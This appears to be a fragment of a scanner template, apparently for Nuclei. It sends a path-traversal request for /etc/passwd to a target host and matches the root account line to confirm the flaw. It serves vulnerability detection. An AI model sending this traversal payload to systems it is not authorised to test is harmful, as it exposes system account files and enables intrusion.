http:
- matchers:
  - status:
    - 200
    type: status
  - regex:
    - 'root:.*:0:0:'
    type: regex
  matchers-condition: and
  raw:
  - 'GET /../../../../../../../../../../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Referer: {{Hostname}}

    '
